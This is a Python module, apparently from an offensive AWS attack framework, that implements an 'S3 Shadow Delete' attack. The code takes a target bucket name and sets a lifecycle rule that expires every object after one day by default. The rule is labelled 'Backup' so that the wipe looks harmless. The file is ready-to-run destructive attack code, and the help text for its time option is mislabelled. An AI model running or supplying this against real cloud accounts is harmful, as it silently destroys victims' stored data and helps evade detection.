import argparse
import boto3
from botocore.exceptions import ClientError

from .DoorModule import DoorModule

class S3ShadowDelete(DoorModule):
    class Meta:
        name = 'AWS S3 Shadow Delete'
        help = 'Delete all objects from an S3 using the Lifecycle Policy'

    def __init__(self, argv:list[str]):
        parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
        parser.add_argument(
            '-n',
            '--name',
            help='The bucket name to flush',
            required=True
        )
        parser.add_argument(
            '-t',
            '--time',
            help='The bucket name to flush',
            default=1,
            required=False
        )
        args, _ = parser.parse_known_args(argv)
        self.name = args.name
        self.time = args.time

    def run(self):
        s3 = boto3.client('s3')

        lifecycle_configuration = {
            'Rules': [
                {
                    'ID': 'Backup',
                    'Filter': {'Prefix': ''},
                    'Status': 'Enabled',
                    'Expiration': {'Days': self.time},
                }
            ]
        }

        try:
            s3.put_bucket_lifecycle_configuration(
                Bucket=self.name,
                LifecycleConfiguration=lifecycle_configuration
            )
            print(f"[+] Lifecycle policy set to delete all objects in '{self.name}'")
        except Exception as e:
            print(f"[x] Failed to set lifecycle policy: {e}")